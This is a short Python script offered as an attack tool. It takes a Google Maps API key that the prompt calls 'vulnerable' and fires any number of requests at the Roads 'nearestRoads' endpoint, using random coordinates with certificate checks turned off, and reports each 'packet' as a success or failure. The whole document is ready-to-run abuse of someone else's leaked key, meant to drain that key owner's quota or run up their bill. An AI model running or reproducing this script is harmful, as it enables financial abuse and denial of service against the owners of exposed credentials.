#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama, calendar, time
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def generate_url(apikey):
    lat_a = random.randrange(-89,90)
    lat_b = random.randrange(0,100000)
    lng_a = random.randrange(-89,90)
    lng_b = random.randrange(0,100000)
    return f"https://roads.googleapis.com/v1/nearestRoads?points={lat_a}.{lat_b},{lng_a}.{lng_b}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to nearest roads: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey)
        response = requests.get(url, verify=False)
        if response.text.find("error") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

